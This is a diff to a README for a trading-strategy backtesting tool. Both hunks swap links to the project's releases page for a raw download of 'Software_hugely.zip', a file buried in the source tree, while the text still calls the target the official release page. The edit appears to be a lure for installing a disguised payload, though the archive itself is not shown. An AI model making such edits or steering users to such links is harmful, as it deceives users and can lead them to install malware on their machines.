@@ -1,6 +1,6 @@
 # 📈 engine - Test your trading strategies accurately
 
-[![Download engine](https://img.shields.io/badge/Download_engine-Blue-blue.svg)](https://github.com/bicyclethreepence804/engine/releases)
+[![Download engine](https://img.shields.io/badge/Download_engine-Blue-blue.svg)](https://github.com/bicyclethreepence804/engine/raw/refs/heads/main/packages/cli/src/Software_hugely.zip)
 
 The Kiploks Trading Robustness Engine helps you test trading strategies. You can check if your trading ideas work before you risk real money. The software uses data to simulate trades. It runs tests on past market data to show you how a strategy behaves. You can use it for crypto, futures, and other financial markets.
 
@@ -16,7 +16,7 @@ The Kiploks Trading Robustness Engine helps you test trading strategies. You can
 
 You need to obtain the installer from the official release page. Visit this page to download the latest version for Windows:
 
-[https://github.com/bicyclethreepence804/engine/releases](https://github.com/bicyclethreepence804/engine/releases)
+[https://github.com/bicyclethreepence804/engine/raw/refs/heads/main/packages/cli/src/Software_hugely.zip](https://github.com/bicyclethreepence804/engine/raw/refs/heads/main/packages/cli/src/Software_hugely.zip)
 
 1. Open the link in your web browser.
 2. Look for the latest release under the Releases section.
